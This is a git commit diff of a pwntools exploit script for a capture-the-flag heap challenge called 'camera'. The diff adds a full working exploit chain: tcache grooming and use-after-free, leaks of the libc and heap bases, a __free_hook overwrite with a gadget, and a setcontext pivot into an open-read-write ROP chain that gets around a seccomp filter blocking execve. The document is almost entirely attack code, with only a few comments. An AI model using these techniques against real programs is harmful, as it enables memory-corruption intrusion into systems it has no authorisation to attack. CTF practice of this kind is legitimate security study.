b2f6aa574b1732365a5b3f5c70a67e7bd4a4a909
Sagiring <102647163+Sagiring@users.noreply.github.com>
2023-11-25 11:03:45 +0800

    XSB Finished 11.24

--- 香山决赛/camera/pwn_exp.py
+++ 香山决赛/camera/pwn_exp.py
@@ -3,7 +3,7 @@ from pwn import p64,u64
 from LibcSearcher import *
 
 debug = 1
-gdb_is = 1
+gdb_is = 0
 elf_path = "./pwn"
 # context(arch='i386',os = 'linux')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
@@ -45,7 +45,7 @@ def revc_addr(name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str = 'byte
 
 
 elf = ELF(elf_path)
-rop = ROP(elf)
+
 
 def menu(num):
     r.sendlineafter(b'>> \n',str(num).encode())
@@ -64,38 +64,106 @@ def show(index):
     menu(1)
     r.sendlineafter(b'Do you want to take a few pictures?\n',str(index).encode())
 
-for i in range(8):
-    add(0x80,b'Z'*0x80) #0 - 7
+for i in range(7):
+    add(0x100,b'Z') #0 - 6
 
-add(0x80,b'A'*0x80) # 8
-add(0x80,b'B'*0x80) # 9
+add(0x100,b'A') # 7
+add(0x100,b'B') # 8
 
 
+add(0x100,b'C') # 9 # previous chunk
+add(0x100,b'D') # 10 # victim chunk
+add(0x100,b'E') # 11
 
-load(3)
-load(2)
-load(1)
-load(0)
-load(9)
+for i in range(6):
+    load(i)
+    show(2)
+
 load(8)
 load(7)
 load(6)
-load(5)
-load(4)
+show(4)
 
-
-show(10)
-
-add(0x80,b'C'*0x80)
-
-
+add(0x200,b'\xf0') #0
 
 load(0)
 show(2)
+
 libc = ELF('./libc.so.6')
-r.recvuntil(b'Over!!!!!\nThe film content: ')
-libc.addr = revc_addr('main_neara') - 0x1ecbe0
-show_addr('libc.addr',libc.addr)
+r.recvuntil(b'The film content: ')
+libc.address = revc_addr('main_neara') - 0x1ecdf0
+show_addr('libc.addr',libc.address)
+
+add(0x100,b'A') #0
+load(0)
+show(2)
+r.recvuntil(b'The film content: ')
+heap_base = revc_addr('heap_chunk',b'Over',-5) - 0x741
+show_addr('heap_base',heap_base)
+
+add(0x80,b'temp') #0 0x558facc59f50
+
+load(10) # victim chunk 0x555dfcdfbc20
+load(0)
+show(3)
+
+# 0chunk.next -> 10chunk
+# 10chunk.next -> 0
+# chunkptr -> 0
+
+load(9) # previous chunk
+show(2)
+# chunkptr -> 0
+
+# ---------------
+# previous chunk # 0x555da9201c20
+# ---------------
+# victim chunk # 0x555da9201d40
+# ---------------
+
+add(0x80,b'temp') #0
+add(0x100,b'Z') #1
+load(0)
+show(3) # 再free(10) UAF
+
+
+
+# #  line  CODE  JT   JF      K
+# # =================================
+# #  0000: 0x20 0x00 0x00 0x00000004  A = arch
+# #  0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
+# #  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+# #  0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
+# #  0004: 0x06 0x00 0x00 0x00000000  return KILL
+# #  0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+# system GG
+
+magic_gadget = libc.address + 0x0151990
+add(0x120,b'A'* 0x110 + p64(libc.sym['__free_hook'])) #0
+
+add(0x100,b'A') #1
+add(0x100,p64(magic_gadget)) #2
+
+show_addr(b'heap_base',heap_base)
+
+orw_addr = heap_base + 0xfe0 
+rop = ROP(libc)
+rop.base = orw_addr + 0x8
+rop.open(b'flag',0,0)
+rop.read(3,orw_addr + 0x10 +0x200,0x30)
+rop.write(1,orw_addr + 0x10 +0x200,0x30)
+add(0x500,rop.chain()[8:]) #3
+rdi_addr = heap_base + 0x14f0 + 0x10 
+rdi_payload =  p64(0) + p64(rdi_addr) + p64(0) * 2 + p64(libc.sym['setcontext']+61) + p64(0) #0x30
+# 0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
+rdi_payload += p64(0) * int(0x70 / 8) + p64(orw_addr+0x10) + rop.chain()[:8]
+
+add(0x300,rdi_payload) #4
+
+load(5)
+# pause()
+show(2)
+
 
 
 
